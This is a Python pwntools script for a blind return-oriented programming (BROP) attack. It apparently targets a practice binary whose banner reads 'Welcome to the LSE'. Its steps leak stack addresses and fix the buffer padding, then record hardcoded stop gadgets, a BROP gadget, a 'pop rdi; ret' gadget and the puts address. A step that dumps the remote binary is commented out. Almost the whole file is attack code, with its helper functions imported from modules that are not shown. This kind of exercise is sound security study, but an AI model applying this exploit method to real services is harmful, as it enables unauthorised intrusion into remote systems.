#!/usr/bin/env python3

from pwn import *
from exploit import *
from utils import debugInfo
import sys

def main(debug):
    #pad = getPadding(debug)
    pad = 40
    log.success(f'padding = {pad}')

    for off in [8, 16, 32, 40]:
        leak = leakAddr(off)
        debugInfo(f'leaked address at offset {off} = {hex(leak)}', debug)

    #addr = leakAddr(pad)
    addr = 0x4011cc
    log.success(f'leaked return addr = {hex(addr)}')

    refs = [b'Bye!\n',
            b'Welcome to the LSE,',
            b'Hello you!\nWhat\'s your name?\n>>> ']
    ref = refs[0]
    base_addr = 0x400000

    #stop_gadgets = getStopGadgets(pad, base_addr, ref, debug)
    stop_gadgets = [0x4011cc, 0x4011cd]
    log.success(f'stop gagdets = {[hex(a) for a in stop_gadgets]}')
    log.success(f'chosen stop gagdet = {hex(stop_gadgets[0])}')

    #brop_gadgets = getBropGadgets(pad, base_addr, ref, stop_gadgets, debug)
    brop_gadgets = [0x401232]
    pop_rdi = brop_gadgets[0] + 0x9
    log.success(f'brop gadgets = {[hex(a) for a in brop_gadgets]}')
    log.success(f'`pop rdi; ret` gadget = {hex(pop_rdi)}')

    #puts_addr = getPutsAddr(pad, stop_gadgets[0], pop_rdi, base_addr, debug)
    puts_addr = 0x401025
    log.success(f'puts address = {hex(puts_addr)}')

    #dumpBinary(ref, pad, base_addr, pop_rdi, puts_addr, stop_gadgets[0], debug)

    '''
    '''


if __name__ == '__main__':
    debug = False
    if len(sys.argv) > 1 and sys.argv[1] == 'debug':
        debug = True
    main(debug)
